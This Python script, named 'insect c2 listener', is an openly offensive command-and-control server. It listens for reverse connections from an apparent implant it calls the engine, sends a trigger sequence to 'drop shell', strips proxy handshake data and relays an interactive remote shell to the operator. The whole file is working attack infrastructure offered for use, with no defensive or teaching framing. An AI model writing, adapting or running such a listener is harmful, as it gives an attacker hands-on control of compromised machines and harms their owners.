#!/usr/bin/env python3
#
# insect c2 listener
# 
# handles reverse connections from the engine,
# drains proxy handshakes, and provides a pty shell.

import socket
import sys
import threading
import argparse
import time
import select

# --- formatting ---

class colors:
    blue    = '\033[94m'
    green   = '\033[92m'
    yellow  = '\033[93m'
    red     = '\033[91m'
    magenta = '\033[95m'
    cyan    = '\033[96m'
    bold    = '\033[1m'
    reset   = '\033[0m'

def log_info(msg):
    print(f"{colors.blue}[*]{colors.reset} {msg}")

def log_success(msg):
    print(f"{colors.green}[+]{colors.reset} {msg}")

def log_error(msg):
    print(f"{colors.red}[-]{colors.reset} {msg}")

def print_banner():
    print(f"{colors.green}{colors.bold}")
    art = """
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⣶⣶⣶⣤⡀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⠿⠿⣿⣿⣿⡄
⠀⠀⠀⠀⠀⠀⢸⡿⣛⡅⢸⣿⣷⣿⣿⣿⡇
⠀⠀⠀⠀⣀⠀⠘⣾⣿⣷⠀⢛⣵⣿⣿⡿⠃⠀⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⠀⢹⢋⣴⣿⣿⣿⢟⣵⣾⣿⣿⣿⣿⣷⡀⠀⠀
⠀⠀⣤⡶⡿⢶⠀⠈⠻⡿⢛⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀𝙎𝙃𝙐𝙏
⠀⠀⢷⣿⣿⣿⡇⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀𝙐𝙋 !
⠀⠀⢸⣿⣿⣿⠀⠀⠀⢠⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀
⠀⠀⠀⢿⣿⣿⣇⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⠀⠀⠀⠘⣿⣿⣿⣧⣼⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⡟⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⡟⠁⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

         insect v1.0 c2
"""
    for line in art.splitlines():
        print(line)
        time.sleep(0.02)
    print(f"{colors.reset}")


# --- net loop ---

class c2_listener:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.is_spinning = False

    def _spinner(self):
        chars = ["|", "/", "-", "\\"]
        idx = 0
        while self.is_spinning:
            sys.stdout.write(f"\r{colors.blue}[*]{colors.reset} listening on {self.host}:{self.port}... {colors.yellow}{chars[idx % 4]}{colors.reset}")
            sys.stdout.flush()
            time.sleep(0.1)
            idx += 1
        sys.stdout.write("\r" + " " * 60 + "\r")
        sys.stdout.flush()

    def _interactive_shell(self, conn):
        # drain proxy noise
        conn.setblocking(False)
        time.sleep(0.5)
        try:
            while conn.recv(8192): pass
        except BlockingIOError:
            pass
        except Exception:
            pass
        conn.setblocking(True)

        sys.stdout.write(f"{colors.yellow}{colors.bold}insect$ {colors.reset}")
        sys.stdout.flush()
        
        prompt_pending = False

        # optimized multiplexer
        while True:
            try:
                r_ready, _, _ = select.select([conn, sys.stdin], [], [], 0.05)
                
                if conn in r_ready:
                    data = conn.recv(8192)
                    if not data:
                        break
                    sys.stdout.write(data.decode('utf-8', errors='replace'))
                    sys.stdout.flush()
                    prompt_pending = True

                if sys.stdin in r_ready:
                    cmd = sys.stdin.readline()
                    if not cmd:
                        break
                    
                    if cmd.strip().lower() in ["exit", "quit", "die"]:
                        break
                        
                    conn.sendall(cmd.encode())
                    prompt_pending = True

                # restore prompt if we printed output
                if not r_ready and prompt_pending:
                    sys.stdout.write(f"{colors.yellow}{colors.bold}insect$ {colors.reset}")
                    sys.stdout.flush()
                    prompt_pending = False

            except KeyboardInterrupt:
                break
            except Exception:
                break

        log_info("session closed.")

    def run(self):
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)

            while True:
                self.is_spinning = True
                threading.Thread(target=self._spinner, daemon=True).start()
                
                conn, addr = self.sock.accept()
                
                self.is_spinning = False
                time.sleep(0.2)
                
                log_success(f"caught connection from {colors.magenta}{addr[0]}:{addr[1]}{colors.reset}")
                
                sys.stdout.write(f"{colors.blue}[*]{colors.reset} triggering ")
                for _ in range(3):
                    sys.stdout.write(".")
                    sys.stdout.flush()
                    time.sleep(0.2)
                print(" " + colors.green + "ok" + colors.reset)
                
                # drop shell
                conn.sendall(b"\xde\xad")
                
                self._interactive_shell(conn)
                conn.close()
                
                log_info("awaiting next connection...")

        except KeyboardInterrupt:
            self.is_spinning = False
            log_info("\nexiting")
        except Exception as e:
            self.is_spinning = False
            log_error(f"bind failed: {e}")
        finally:
            self.sock.close()
            sys.exit(0)


# --- entry ---

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", type=int, default=8080)
    parser.add_argument("-H", default="0.0.0.0")
    args = parser.parse_args()
    
    print_banner()
    
    srv = c2_listener(args.H, args.p)
    srv.run()
